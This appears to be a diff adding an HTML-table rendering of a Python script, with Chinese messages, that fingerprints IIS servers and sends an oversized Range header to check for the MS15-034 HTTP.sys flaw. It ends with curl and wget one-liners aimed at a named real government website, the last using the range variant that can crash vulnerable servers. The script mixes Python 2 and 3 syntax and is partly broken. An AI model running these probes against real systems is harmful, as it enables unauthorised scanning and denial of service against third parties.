@@ -1,0 +1,153 @@
+<TR><TD>#!/usr/bin/env python</TD>
+<TD></TD>
+</TR>
+<TR><TD># coding=utf-8</TD>
+<TD></TD>
+</TR>
+<TR><TD># -*- coding: utf-8 -*-</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>import requests</TD>
+<TD></TD>
+</TR>
+<TR><TD>def identify_iis(domain):</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    req = requests.get(str(domain))</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    remote_server = req.headers[&#39;server&#39;]</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    if &#39;Microsoft-IIS&#39; in remote_server:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        print(u&#39;服务是&#39; + remote_server)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        ms15_034_test(str(domain))</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    else:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        print(&#39;服务器不是IIS\n可能是: &#39; + remote_server)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>def ms15_034_test(domain):</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    print(&#39;启动vuln检查！&#39;)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    headers = {&#39;Host&#39;: &#39;stuff&#39;,&#39;Range&#39;: &#39;bytes=0-18446744073709551615&#39;}</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    req = requests.get(str(domain), headers = headers)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    if &#39;Requested Range Not Satisfiable&#39; in req.content:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        print &#39;存在HTTP.sys远程代码执行漏洞！&#39;</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    elif &#39;The request has an invalid header name&#39; in req.content:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        print &#39;漏洞已修复&#39;</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    else:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>        print &#39;IIS服务无法显示漏洞是否存在，需要手动检测&#39;</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>if __name__== &#39;__main__&#39;:</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    usr_domain = raw_input(&#39;输入域名扫描: &#39;)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>    identify_iis(usr_domain)</TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD></TD>
+<TD></TD>
+</TR>
+<TR><TD>curl http://www.yltjj.gov.cn/admin/scripts/common.js -H &quot;Host: irrelevant&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;|grep &quot;range is not satisfiable&quot;</TD>
+<TD></TD>
+</TR>
+<TR><TD>wget http://www.yltjj.gov.cn/admin/scripts/common.js –debug –header=”Range: bytes=0-18446744073709551615″</TD>
+<TD></TD>
+</TR>
+<TR><TD>wget http://www.yltjj.gov.cn/admin/scripts/common.js –header=&quot;Range:bytes=184900-18446744073709551615&quot;</TD>
+<TD></TD>
+</TR>
